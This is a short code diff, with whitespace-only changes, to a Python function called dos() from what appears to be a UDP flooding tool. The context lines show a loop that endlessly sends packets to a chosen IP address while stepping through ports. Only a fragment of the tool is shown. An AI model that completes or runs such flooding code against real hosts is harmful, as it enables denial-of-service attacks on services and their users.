@@ -121,7 +121,6 @@ def dos(*args):
 	#if args.repeat:
 		#for x in args.repeat
 
-
 	while True:
 		try:
 			sock.sendto(bytes, (ip, port)) # use the socket module to send them
@@ -141,9 +140,6 @@ def dos(*args):
 			port += 1 # change the entered port by 1 every packet so there is no overflow
 
 
-
-
-
 		except socket.gaierror as sg:
 			print("\n" + Args + " Failed! you entered an invalid ipaddress or port")
 			print("Error is: ", sg)
@@ -154,8 +150,6 @@ def dos(*args):
 		except KeyboardInterrupt: # if ctrl-c is pressed
 			print ("caught keyboard interrupt - quitting...")
 			sys.exit (0)
-
-
 
 
 def main():
